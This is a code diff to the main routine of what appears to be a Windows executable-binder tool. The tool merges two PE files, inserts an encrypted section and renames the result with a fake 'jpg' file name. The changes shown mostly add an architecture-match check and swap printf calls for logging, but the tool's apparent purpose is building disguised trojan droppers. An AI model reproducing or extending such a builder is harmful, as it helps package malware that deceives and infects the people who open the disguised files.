@@ -20,6 +20,7 @@
 #include "crypto.h"
 #include "FileHelper.h"
 #include "main.h"
+#include "PEParser.h"
 
 #define CONFIG_FILENAME					"config.dat"
 
@@ -81,6 +82,13 @@ int main(_In_ int argc, _In_reads_(argc) _Pre_z_ char** argv, _In_z_ char** envp
 			type = BIND_RELEASE_EXE;
 			cpu_arch = GetPeArch(argv[seq +1]);
 
+			int cpu_arch2 = GetPeArch(argv[seq + 2]);
+
+			if (cpu_arch != cpu_arch2) {
+				log("file:%s arch:%x not equal to file:%s arch:%x\r\n",argv[seq+1], cpu_arch, argv[seq + 2], cpu_arch2);
+				exit(-1);
+			}
+
 			for (int j = seq + 1; j < seq +3; j++)
 			{
 				lstrcpyA(filelist[paramscnt], argv[j]);
@@ -134,9 +142,8 @@ int main(_In_ int argc, _In_reads_(argc) _Pre_z_ char** argv, _In_z_ char** envp
 		}
 		else if (lstrcmpiA(str, "-p") == 0)
 		{
-
 			if (seq + 2 > argc) {
-				printf("argument error\r\n");
+				log("argument error\r\n");
 				return -1;
 			}
 			Public::prepareParams(argv[seq + 1], argv[seq + 2],type, key,CONFIG_FILENAME);
@@ -151,8 +158,7 @@ int main(_In_ int argc, _In_reads_(argc) _Pre_z_ char** argv, _In_z_ char** envp
 		{
 			bRename = TRUE;
 			continue;
-		}
-		
+		}	
 	}
 
 	if (szoutFn[0] == 0)
@@ -161,15 +167,16 @@ int main(_In_ int argc, _In_reads_(argc) _Pre_z_ char** argv, _In_z_ char** envp
 	}
 	if (type == 0)
 	{
-		printf("command line something error!\r\n");
+		log("command error!\r\n");
 		ret = getchar();
 		return -1;
 	}
 
 	printf("TYPE:%d,CPU:%d\r\n",type,cpu_arch);
+
 	if(cpu_arch!= 32 && cpu_arch !=64)
 	{
-		printf("cannot get cpu architecture of target file\r\n");
+		log("cannot get cpu architecture of file:%s\r\n", filelist[0]);
 		ret = getchar();
 		return -1;
 	}
@@ -179,7 +186,7 @@ int main(_In_ int argc, _In_reads_(argc) _Pre_z_ char** argv, _In_z_ char** envp
 	string resultfn = Section::insertSection(type, cpu_arch, secname, filelist, paramscnt,outpath, szoutFn,key);
 	if (resultfn == "")
 	{
-		printf("%s error\r\n",__FUNCTION__);
+		log("%s %d error\r\n",__FUNCTION__,__LINE__);
 		ret = getchar();
 		return -1;
 	}
@@ -193,7 +200,7 @@ int main(_In_ int argc, _In_reads_(argc) _Pre_z_ char** argv, _In_z_ char** envp
 		FakeFilename::fakefn(resultfn, jpg, mystr);
 	}
 
-	printf("bind type:%d cpu arch:%d completed\r\n", type, cpu_arch);
+	printf("%s bind type:%d cpu arch:%d completed\r\n",PROJECT_NAME, type, cpu_arch);
 	ExitProcess(0);
 	return 0;
 }
@@ -216,25 +223,33 @@ int GetPeArch(char * fn) {
 		return -1;
 	}
 	int cpu_arch = PEParser::getPEArch((const char*)data);
-	delete data;
+	
+	int bits = 0;
 	if(cpu_arch == 0x14c)
 	{
-		return 32;
+		bits = 32;
 	}
 	else if(cpu_arch == 0x8664)
 	{
-		return 64;
+		bits = 64;
 	}
 	else {
-
 		return 0;
 	}
+
+	int pebits = GetPeBits(data);
+
+	delete data;
+
+	if (bits == pebits) {
+		return bits;
+	}
+
+	
 	return 0;
 }
 
-//array[x][y]在内存中是随着内存地址递增的,array[x] array[x+1] 差是16，why?
-//*[]结构是指针数组
-//*是数组，也就是存放地址的变量
+
 
 void test() {
 
